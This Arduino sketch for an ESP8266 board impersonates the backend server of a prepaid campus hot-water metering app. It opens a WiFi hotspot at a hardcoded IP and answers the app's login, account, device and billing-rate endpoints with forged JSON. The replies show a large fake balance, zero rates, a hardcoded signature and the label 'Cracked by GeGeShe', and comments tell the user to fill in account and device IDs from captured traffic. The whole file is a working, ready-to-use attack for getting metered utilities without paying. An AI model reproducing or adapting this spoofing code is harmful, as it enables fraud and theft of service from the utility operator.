#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ArduinoJson.h>

IPAddress local_IP(118, 31, 18, 116);
IPAddress gateway(118, 31, 18, 1);
IPAddress subnet(255, 255, 255, 0); //正常情况下无需更改

ESP8266WebServer server(80); //网页走80端口

//////////////////////////////////////////////////////////////////////
//下面是设置区域,请根据抓包结果认真填写"XXX"，酌情填写已经填好的默认选项

//login接口
String tele = "12345678910"; //显示用账号（任意11位）
String logincode = "666666";
String money = "6666660"; //余额（默认6666.66元）
String accid = "XXXX";
String prjid = "X";
String groupid = "X";

//accountInfo接口
String prjname = "Cracked by GeGeShe"; //这段文字会显示

//deviceInfo接口
String dsbtypeid = "X";
String ldid = "XXX";
String mac = "XX:XX:XX:XX:XX:XX"; //水表的mac地址
String lcid = "XXX";
String devtypeid = "X";
String quid = "X";
String devstatusid = "X";
String devid = "XXXX";
String fjid = "XXX";

//downRate接口
String sig = "578deac5a15b696126417065fd240d53"; //长理云塘无需修改
String permoney = "100000"; //单次金额（默认100块）

//esp8266通电后会开一个wifi
String ssid = "ssid"; //wifi名称
String password = "password"; //wifi密码

//////////////////////////////////////////////////////////////////////
//下面的代码理论上不用修改，若是改了上面的还有问题再考虑改下面的
void login() {
  String json0;
  const size_t capacity = JSON_OBJECT_SIZE(3) + JSON_OBJECT_SIZE(11);
  DynamicJsonBuffer jsonBuffer(capacity);
  JsonObject& js0 = jsonBuffer.createObject();
  JsonObject& data = js0.createNestedObject("data");
  data["PrjName"] = prjname;
  data["TelPhone"] = tele;
  data["loginCode"] = logincode;
  data["AccMoney"] = money;
  data["GivenAccMoney"] = 0;
  data["alias"] = tele;
  data["AccStatusID"] = 0;
  data["AccID"] = accid;
  data["PrjID"] = prjid;
  data["GroupID"] = groupid;
  data["tags"] = "kerelease,4";
  js0["error_code"] = "0";
  js0["message"] = "登录成功";
  js0.printTo(json0);
  server.send(200, "text/html", json0 );
}

void accountInfo() {
  String json1;
  const size_t capacity = JSON_OBJECT_SIZE(3) + JSON_OBJECT_SIZE(8);
  DynamicJsonBuffer jsonBuffer(capacity);
  JsonObject& js1 = jsonBuffer.createObject();
  JsonObject& data = js1.createNestedObject("data");
  data["PrjName"] = prjname;
  data["TelPhone"] = tele;
  data["AccMoney"] = money ;
  data["GivenAccMoney"] = 0;
  data["AccStatusID"] = 0;
  data["AccID"] = accid;
  data["PrjID"] = prjid;
  data["GroupID"] = groupid;
  js1["error_code"] = "0";
  js1["message"] = "success";
  js1.printTo(json1);
  server.send(200, "text/html", json1 );
}

void downRate() {
  String json2;
  const size_t capacity = JSON_OBJECT_SIZE(5) + JSON_OBJECT_SIZE(15);
  DynamicJsonBuffer jsonBuffer(capacity);
  JsonObject& js2 = jsonBuffer.createObject();
  js2["LeadMoneyReal"] = 0;
  JsonObject& data = js2.createNestedObject("data");
  data["Rate1"] = 0;
  data["MinMoney"] = 0;
  data["Rate3"] = 0;
  data["Rate2"] = 0;
  data["signature"] = sig;
  data["AutoDisConTime"] = 6;
  data["UseCount"] = 5;
  data["MinChargeUnit"] = 10;
  data["AccStatusID"] = 0;
  data["ParaTypelD"] = 1;
  data["PerMoney"] = permoney;
  data["ConsumeDT"] = "20181213214637";
  data["ChargeMethod"] = 17;
  data["DevStatusID"] = 0;
  data["MinTime"] = 0;
  js2["LeadMoneyGiven"] = 0;
  js2["error_code"] = "0";
  js2["message"] = "下发费率成功";
  js2.printTo(json2);
  server.send(200, "text/html", json2 );
}

void deviceInfo() {
  String json3;
  const size_t capacity = JSON_ARRAY_SIZE(1) + JSON_OBJECT_SIZE(2) + JSON_OBJECT_SIZE(20);
  DynamicJsonBuffer jsonBuffer(capacity);
  JsonObject& js3 = jsonBuffer.createObject();
  JsonArray& data = js3.createNestedArray("data");
  JsonObject& data_0 = data.createNestedObject();
  data_0["DevName"] = "热水表";
  data_0["QUName"] = "XXX";
  data_0["FJName"] = "XXX";
  data_0["PrjName"] = prjname;
  data_0["IsUse"] = 1;
  data_0["LCName"] = "X层";
  data_0["DevDescript"] = "热水表";
  data_0["Dsbtypeid"] = dsbtypeid;
  data_0["LDID"] = ldid;
  data_0["LDName"] = "X";
  data_0["DsbName"] = "热水表";
  data_0["devMac"] = mac;
  data_0["LCID"] = lcid;
  data_0["DevTypeName"] = "热水表";
  data_0["DevTypeID"] = devtypeid;
  data_0["QUID"] = quid;
  data_0["DevStatusID"] = devstatusid;
  data_0["DevID"] = devid;
  data_0["PrjID"] = prjid;
  data_0["FJID"] = fjid;
  js3["error_code"] = "0";
  js3.printTo(json3);
  server.send(200, "text/html", json3 );
}

void savexf() {
  String json4;
  const size_t capacity = JSON_OBJECT_SIZE(5);
  DynamicJsonBuffer jsonBuffer(capacity);
  JsonObject& js4 = jsonBuffer.createObject();
  js4["UpLeadMoney"] = permoney;
  js4["UpMoney"] = 0;
  js4["FishTime"] = "2018-12-13 21:46:45";
  js4["error_code"] = "0";
  js4["PerMoney"] = permoney;
  js4.printTo(json4);
  server.send(200, "text/html", json4 );
}

void getDevOrder() {
  String json5;
  const size_t capacity = JSON_OBJECT_SIZE(2);
  DynamicJsonBuffer jsonBuffer(capacity);
  JsonObject& js5 = jsonBuffer.createObject();
  js5["error_code"] = "-1";
  js5["message"] = "查询预约信息失败";
  js5.printTo(json5);
  server.send(200, "text/html", json5 );
}

void setup() {
  Serial.begin(115200);
  WiFi.softAPConfig(local_IP, gateway, subnet);
  WiFi.softAP(ssid, password);

  server.on("/appI/api/accountInfo", accountInfo);
  server.on("/appI/api/downRate", downRate);
  server.on("/appI/api/deviceInfo", deviceInfo);
  server.on("/appI/api/savexf", savexf);
  server.on("/appI/api/login", login);
  server.on("/appI/api/getDevOrder", getDevOrder);

  server.begin();
}

void loop() {
  server.handleClient();
}
